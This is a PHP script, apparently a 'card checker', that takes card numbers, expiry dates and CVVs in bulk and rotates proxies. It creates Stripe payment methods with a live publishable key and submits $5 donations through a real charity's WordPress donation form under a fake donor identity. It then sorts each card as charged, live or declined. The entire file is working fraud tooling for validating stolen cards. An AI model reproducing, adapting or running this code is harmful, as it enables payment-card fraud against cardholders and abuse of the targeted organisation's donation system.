<?php 
////////////////////////////===RAW BY HARIS===////////////////////////////
require 'function.php';

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[1 Req]

sleep(10);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&key=pk_live_51OKEhWBGWy1jRB0rDTwbHcXKScpVLiu1jPVgmXvLxPhErXoOgIEEaayQtmr8M0bbLWRhYQ8nfQ8NFhHYFJEEifb000RjXRuH2t');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

////////////////////////////===[2 Req]

sleep(10);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://tctamn.org/wp-admin/admin-ajax.php?t=1716514915178');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1716514915178 h2',
'Host: tctamn.org',
'accept: */*',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://tctamn.org',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://tctamn.org/donation/',
'accept-language: en-US,en;q=0.9',
));

////////////////////////////===[2 Req Postfields]////////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D2050%26_fluentform_3_fluentformnonce%3Da3b030d75a%26_wp_http_referer%3D%252Fdonation%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_input%3DOther%26custom-payment-amount%3D5%26input_text%3D%26description%3D%26payment_method%3Dstripe%26item__3__fluent_checkme_%3D%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');

$result2 = curl_exec($ch);

////////////////////////////===[Responses CVV]===////////////////////////////

if
(strpos($result2,  'success')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>🔥 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV CHARGED 5$ 🔥</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
}

elseif
(strpos($result2,  'security code is incorrect')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
}

elseif
(strpos($result2,  'insufficient funds')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: INSUFFICENT FUNDS ✅ </i></font><br> <font class='badge badge-dark'> $bank $country Power Bysanji ⚡ </i></font><br>";
}

else {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>❌ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Result: GENERIC DECLINED ❌ </i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;
//echo $result2;
////////////////////////////===RAW BY HARIS===////////////////////////////
?>
